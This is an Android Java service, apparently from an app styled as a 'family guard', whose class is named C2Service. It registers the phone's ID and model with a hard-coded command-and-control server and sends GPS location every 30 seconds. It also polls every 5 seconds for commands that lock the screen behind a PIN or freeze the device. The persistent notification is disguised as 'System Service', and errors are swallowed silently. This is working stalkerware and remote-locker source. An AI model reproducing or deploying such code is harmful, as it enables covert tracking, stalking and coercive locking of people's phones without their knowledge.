package com.family.guard;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.location.Location;
import android.location.LocationManager;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Timer;
import java.util.TimerTask;

public class C2Service extends Service {
    private static final String C2_URL = "http://100.72.238.226:5000/api";
    private String androidId;

    @Override
    public void onCreate() {
        super.onCreate();
        
        androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel channel = new NotificationChannel("fg_channel", "Service", NotificationManager.IMPORTANCE_LOW);
                NotificationManager manager = getSystemService(NotificationManager.class);
                if (manager != null) manager.createNotificationChannel(channel);
                
                Notification notification = new Notification.Builder(this, "fg_channel")
                        .setContentTitle("System Service")
                        .setSmallIcon(android.R.drawable.ic_menu_mylocation)
                        .build();
                startForeground(1, notification);
            }
        } catch (Exception e) { }

        registerDevice();

        Timer timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                sendLocation();
            }
        }, 0, 30000);

        Timer cmdTimer = new Timer();
        cmdTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                checkCommands();
            }
        }, 0, 5000);
    }

    private void registerDevice() {
        try {
            JSONObject data = new JSONObject();
            data.put("id", androidId);
            data.put("brand", Build.BRAND);
            data.put("model", Build.MODEL);
            postData(C2_URL + "/register", data.toString());
        } catch (Exception e) { }
    }

    private void checkCommands() {
        try {
            URL url = new URL(C2_URL + "/get_command/" + androidId);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = in.readLine()) != null) response.append(line);
            in.close();

            JSONObject json = new JSONObject(response.toString());
            String action = json.optString("action", "none");

            if (action.equals("lock")) {
                Intent lockIntent = new Intent(this, LockActivity.class);
                lockIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                lockIntent.putExtra("msg", json.optString("msg", "Device Locked"));
                lockIntent.putExtra("pin", json.optString("pin", "1234"));
                startActivity(lockIntent);
            } else if (action.equals("unlock")) {
                Intent unlockIntent = new Intent("ACTION_UNLOCK_DEVICE");
                sendBroadcast(unlockIntent);
            } else if (action.equals("freeze")) {
                Intent freezeIntent = new Intent(this, FreezeActivity.class);
                freezeIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(freezeIntent);
            } else if (action.equals("stop_freeze")) {
                Intent stopFreezeIntent = new Intent("ACTION_STOP_FREEZE");
                sendBroadcast(stopFreezeIntent);
            }
        } catch (Exception e) { }
    }

    private void sendLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc != null) {
                JSONObject data = new JSONObject();
                data.put("id", androidId);
                data.put("lat", loc.getLatitude());
                data.put("lon", loc.getLongitude());
                postData(C2_URL + "/gps", data.toString());
            }
        } catch (Exception e) { }
    }

    private void postData(String urlStr, String jsonStr) {
        try {
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            OutputStream os = conn.getOutputStream();
            os.write(jsonStr.getBytes());
            os.flush();
            os.close();
            conn.getResponseCode();
        } catch (Exception e) { }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
